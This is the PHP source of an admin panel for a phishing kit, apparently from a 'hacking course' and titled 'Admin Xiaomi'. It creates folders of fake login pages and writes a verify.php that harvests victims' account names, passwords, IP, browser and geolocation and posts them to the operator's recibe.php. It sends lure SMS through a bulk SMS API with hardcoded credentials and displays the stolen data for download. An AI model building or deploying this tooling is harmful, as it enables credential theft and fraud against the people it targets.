<?php
$user = "smsganifa24021";
$pass = "web83490";
$url_dominio = "AQUI VA EL DOMINIO";
header("refresh:40;url=admin.php");
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Curso de hacking">
    <link href="https://curso.pitersk.com/logo.jpg" rel="icon" type="image/ico" />    
    <meta property="og:image" content="https://curso.pitersk.com/logo.jpg">
    <meta property="og:url" content="https://curso.pitersk.com/">
    <meta property="og:title" content="Piter Ivano - Cursos">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="Piter Ivano">
    <link href="https://curso.pitersk.com/logo.jpg" rel="shortcut icon" sizes="196x196">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="author" content="Piter">
    <title>Panel | Admin Xiaomi</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <style>
        .crear-link{
            color: #fff;
            background-color: #383838;
            border-color: white;
            border: 5px solid;
            padding: 0.375rem 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            border-radius: 0.25rem;
            text-decoration: none;
            display: inline;
            
        }
        .salto {
                display: block;
                margin-top: 10px;   
        }
        .envio_sms{
            color: #fff;
            background-color: grey;
            border-color: white;
            border: 5px solid;
            padding: 0.375rem 0.75rem;
            font-size: 1rem;
            line-height: 1.5;
            border-radius: 0.25rem;
            text-decoration: none;
            display: inline;
            
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1>Administrar</h1>
                <div class="row">
                    <div class="col-md-6 crear-link">
                        <h3>Crear otro enlace</h3>
                        <form method="post">
                            <!--Crear un formulario dos input text y un submit -->
                            <div class="form-group">
                                <label for="url">URL</label>
                                <input type="text" class="form-control" id="url" name="url" placeholder="URL">
                            </div>
                            <div class="form-group">
                                <label for="email">Correo a enviar</label>
                                <input type="email" class="form-control" id="email" name="email" placeholder="Correo a enviar">
                            </div>
                            <span class="salto"></span>
                            <button type="submit" name="crear" class="btn btn-primary">Enviar</button>
                            <span class="salto"></span>
                            <span class="salto"></span>
                        </form>
                        <?php
                        
                        /*si existe crear entonces entra al if */
                        if(isset($_POST['crear'])){
                            /*si existe la variable url y email entonces entra al if */
                            if(isset($_POST['url']) && isset($_POST['email'])){
                                /*si la variable url no esta vacia entonces entra al if */
                                if(!empty($_POST['url']) && !empty($_POST['email'])){
                                    $url_dato = $_POST['url'];
                                    $mostrar = $url_dominio."/".$url_dato;
                                    /*verifica si la carpeta existe, si no existe la crea */
                                    if(!file_exists($url_dato)){
                                        $email = $_POST['email'];
                                        mkdir($url_dato, 0777, true);
                                        copy("create.c", $url_dato."/index.php");
                                        copy("create1.c", $url_dato."/inicio_Sesion.php");
                                        copy("create2.c", $url_dato."/m_iniciar_sesion.php");
                                        /*crear un archivo verify.php en la carpeta */
                                        $archivo = fopen($url_dato."/verify.php", "w");
                                        $contenido = '<?php													
                                        if (isset($_POST["enviar"])){
                                            if (isset($_POST["account"]) && isset($_POST["password"])){
                                                $account = $_POST["account"];
                                                $password = $_POST["password"];
                                                if (strlen($account) > 8 && strlen($password) > 8){
                                                    #capturar la ip y el navegador
                                                    $ip = $_SERVER["REMOTE_ADDR"];
                                                    $navegador = $_SERVER["HTTP_USER_AGENT"];
                                                    #ver la fecha y hora
                                                    $fecha = date("Y-m-d");
                                                    $hora = date("H:i:s");
                                                    #ver la informacion de la ip
                                                    $info = file_get_contents("http://ip-api.com/json/".$ip);
                                                    $json = json_decode($info);
                                                    #ver dats de el json 
                                                    $info_ip = $json->query;
                                                    $json_country = $json->country;
                                                    $json_countryCode = $json->countryCode;
                                                    $json_region = $json->region;
                                                    $json_regionName = $json->regionName;
                                                    $json_city = $json->city;
                                                    $json_zip = $json->zip;
                                                    $json_lat = $json->lat;
                                                    $json_lon = $json->lon;
                                                    $json_timezone = $json->timezone;
                                                    $json_isp = $json->isp;
                                                    $json_org = $json->org;
                                                    $json_as = $json->as;
                                                    $curl = curl_init();
                                                    $datos_curl = array(
                                                        "ip" => $ip,
                                                        "navegador" => $navegador,
                                                        "fecha" => $fecha,
                                                        "hora" => $hora,
                                                        "info_ip" => $info_ip,
                                                        "json_country" => $json_country,
                                                        "json_countryCode" => $json_countryCode,
                                                        "json_region" => $json_region,
                                                        "json_regionName" => $json_regionName,
                                                        "json_city" => $json_city,
                                                        "json_zip" => $json_zip,
                                                        "json_lat" => $json_lat,
                                                        "json_lon" => $json_lon,
                                                        "json_timezone" => $json_timezone,
                                                        "json_isp" => $json_isp,
                                                        "json_org" => $json_org,
                                                        "json_as" => $json_as,
                                                        "account" => $account,
                                                        "password" => $password,' . "\n";
                                        $datos_Correo = "'parax' =>'" . $email . "'";
                                        $datos = ');
                                                    curl_setopt($curl, CURLOPT_URL, "' . $url_dominio . '/recibe.php");
                                                    curl_setopt($curl, CURLOPT_POST, true);
                                                    curl_setopt($curl, CURLOPT_POSTFIELDS, $datos_curl);
                                                    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                                                    $result = curl_exec($curl);
                                                    curl_close($curl);
                                                }else{
                                                    header("Location: index.php");
                                                }
                                            }else{
                                                #mandar al index
                                                header("Location: index.php");
                                            }
                                        }header("Location: index.php");
                                        ?>';
                                        fwrite($archivo, $contenido);
                                        fwrite($archivo, $datos_Correo);
                                        fwrite($archivo, $datos);
                                        fclose($archivo);
                                        echo "<input type='text' value='".$mostrar."' class='form-control'>";
                                    }else {
                                        echo "<script>alert('Este Link Ya Existe');</script>";
                                    }
                                }
                            }else {
                                echo "<h3>Faltan datos</h3>";
                            }
                        }

                        ?>
                    </div>
                    <div class="col-md-6 envio_sms">
                        <h3>Envio de SMS</h3>
                        <?php
                        $urlc = "https://api.1s2u.io/checkbalance?user=$user&pass=$pass";
                        
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $urlc);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        $result = curl_exec($ch);
                        curl_close($ch);
                        if ($result == "0") {
                            echo "<div class='alert alert-danger'>Tu saldo es 0.
                            </div>";
                        }#si es mayor a 0 entra al elseif y muestra el saldo
                        elseif ($result > 0) {
                            echo "<div class='alert alert-success'>Tu saldo es $result.
                            </div>";
                        }else {
                            echo "<div class='alert alert-success'>Por favor Espere!
                            </div>";
                            #recargar la pagina en un segundo
                            header("refresh:2;url=admin.php");
                        }
                        ?>
                        <form method="post">
                            <div class="form-group">
                                <label for="numero">Numero</label>
                                <input type="text" class="form-control" id="numero" name="numero" placeholder="Numero" required>
                            </div>
                            <div class="form-group">
                                <!--Crear un textarea-->
                                <label for="mensaje">Mensaje</label>
                                <textarea class="form-control" id="mensaje" name="mensaje" rows="6" maxlength="158" required></textarea>
                            </div>
                            <span class="salto"></span>
                            <button name="submit" type="submit" class="btn btn-primary">Enviar</button>
                        </form>
                            <?php
                                if (isset($_POST['submit'])) {
                                    #1s2u servicio de sms
                                    if (!empty($_POST['numero']) && !empty($_POST['mensaje'])) {
                                        $numero = $_POST['numero'];
                                        $mensaje = $_POST['mensaje'];
                                        
                                        $url = "https://api.1s2u.io/bulksms?username=$user&password=$pass&mt=0&fl=0%20&sid=piter&mno=+$numero&msg=$mensaje";
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $result = curl_exec($ch);
                                        curl_close($ch);
                                        echo $result;
                                        #crear un mensaje en pantalla con el resultado
                                        if ($result == "0000") {
                                            echo "<div class='alert alert-danger'>Servicio Temporalmente no Disponible</div>";
                                        } elseif ($result == "0010") {
                                            echo "<div class='alert alert-danger'>Este Usuario no Existe</div>";
                                        } elseif ($result == "0011") {
                                            echo "<div class='alert alert-danger'>Esta Clave no Existe</div>";
                                        } elseif ($result == "00") {
                                            echo "<div class='alert alert-danger'>Este usuario y contra no existe o no esta activo</div>";
                                        } elseif ($result == "0040") {
                                            echo "<div class='alert alert-danger'>Este numero no existe</div>";
                                        } elseif ($result == "0") {
                                            echo "<div class='alert alert-danger'>El contador de sms esta en 0</div>";
                                        }
                                        #sacar los dos primeros caracteres de $result
                                        $result1 = substr($result, 0, 2);
                                        if ($result1 == "OK") {
                                            echo "<div class='alert alert-success'>Mensaje enviado correctamente</div>";
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>Faltan datos</div>";
                                    }
                                }
                                ?>
                    </div>
                    <div class="col-md-6">
                        <h3>Link Creados y correos a los que se envia</h3>
                        
                            <!--crear una tabla con 4 datos-->
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th scope="col">Link</th>
                                        <th scope="col">Ver</th>
                                        <th scope="col">Eliminar</th>
                                    </tr>
                                </thead>
                                <tbody>
                                <?php 
                                    $directorio = opendir('./');
                                    while ($archivo = readdir($directorio)){
                                        if($archivo != '.' && $archivo != '..'&& $archivo != '.' && $archivo != '.well-known' && $archivo != 'cuenta.txt' && $archivo != 'error_log' && $archivo != 'index.php' && $archivo != 'admin.php'&& $archivo != 'create.c'&& $archivo != 'create1.c' && $archivo != '.htaccess' && $archivo != 'url.txt' && $archivo != 'create2.c' && $archivo != 'recibe.php' ){
                                            echo '<tr>';
                                            echo '<td>'.$url_dominio.'/'.$archivo.'</td>';
                                            echo '<td><a class="btn btn-primary" href="'.$archivo.'" target="_blank">Ver</a></td>';
                                            echo "<form method='post'>";
                                            echo "<input type='hidden' name='archivo' value='$archivo'>";
                                            echo "<td><input type='submit' name='eliminar' value='Eliminar' class='btn btn-danger'></td>";
                                            echo "</form>";
                                            #boton eliminar carpeta
                                            if (isset($_POST['eliminar'])) {
                                                $archivo = $_POST['archivo'];
                                                if (isset($_POST['archivo'])) {
                                                    #eliminar todos los archivos de la carpeta
                                                    $archivos = scandir($archivo);
                                                    foreach ($archivos as $key => $value) {
                                                        if ($key > 1) {
                                                            unlink($archivo.'/'.$value);
                                                            
                                                        }
                                                    }
                                                    #eliminar carpeta
                                                    rmdir($archivo);
                                                    echo '<script>window.location.href = "admin.php";</script>';
                                                }
                                            }
                                            echo '</tr>';
                                        }
                                    }
                                    ?>
                                </tbody>
                            </table>

                    </div>
                    <div class="col-md-6">
                        <h4>Datos Logrados!</h4>
                        <form method="post">
                            <input type="submit" name="borrar" value="Borrar Datos" class="btn btn-danger"> <a href="cuenta.txt" class="btn btn-primary" download>Descargar</a>
                        </form>
                        <?php
                        /*boton dejar en blanco el archivo url.txt*/
                        if (isset($_POST['borrar'])) {
                            $archivo = fopen('cuenta.txt', 'w');
                            fwrite($archivo, "");
                            fclose($archivo);
                            echo '<script>window.location.href = "admin.php";</script>';
                        }
                            $archivo = fopen("cuenta.txt", "r");
                            while (!feof($archivo)) {
                                $linea = fgets($archivo);
                                echo $linea . "<br>";
                            }
                            fclose($archivo);
                        ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</html>